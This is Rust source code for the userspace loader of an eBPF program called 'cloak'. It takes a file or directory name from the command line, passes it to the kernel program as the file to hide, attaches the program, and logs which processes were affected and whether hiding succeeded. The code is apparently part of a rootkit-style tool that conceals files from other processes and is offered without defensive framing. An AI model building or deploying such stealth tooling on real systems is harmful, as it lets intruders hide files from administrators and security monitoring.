use std::env;
use std::time::Duration;

use plain::Plain;
use libbpf_rs::{RingBufferBuilder, Error};


mod cloak {
    include!(concat!(env!("OUT_DIR"), "/cloak.skel.rs"));
}

use cloak::*;

const TASK_COMM_LEN:usize = 16;


#[repr(C)]
#[derive(Debug, Clone)]
pub struct Event {
    pub payload_len: i32,
    pub comm: [u8; TASK_COMM_LEN],
    pub success: bool,
}

impl Event {
    pub fn default()->Self{
        Event{
            payload_len:0,
            comm: [0;16],
            success: false,
        }
    }
}

unsafe impl Plain for Event{

}



fn rb_handler(data:&[u8]) ->i32 {
    let mut event = Event::default();
    plain::copy_from_bytes(&mut event, data).expect("Data buffer was too short");

    let comm = std::str::from_utf8(&event.comm).unwrap();

    println!(
        "{:16} {:}",
        comm.trim_end_matches(char::from(0)),
        event.success,
    );

    0
}

fn main() -> Result<(),Error>  {
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        print!("Usage process_clock <file or directory name>");
        return Ok(())
    }

    let skel_builder = CloakSkelBuilder::default();

    //skel_builder.obj_builder.debug(true);

    let mut open_skel = skel_builder.open()?;

    let target_folder = &args[1];

    // replace it when you want to target a specific process
    open_skel.rodata().target_ppid = 0;


    open_skel.rodata().file_to_hide_len = target_folder.as_bytes().len() as i32;
    open_skel.rodata().file_to_hide[..target_folder.as_bytes().len()].copy_from_slice(target_folder.as_bytes());

    // Begin tracing
    let mut skel = open_skel.load()?;
    skel.attach()?;

    let mut builder = RingBufferBuilder::new();
    builder.add(skel.maps_mut().rb(), rb_handler).expect("Failed to add ringbuf");
    let ringbuf = builder.build().expect("Failed to build");

    loop {
        ringbuf.poll(Duration::from_millis(100))?;
    }


}

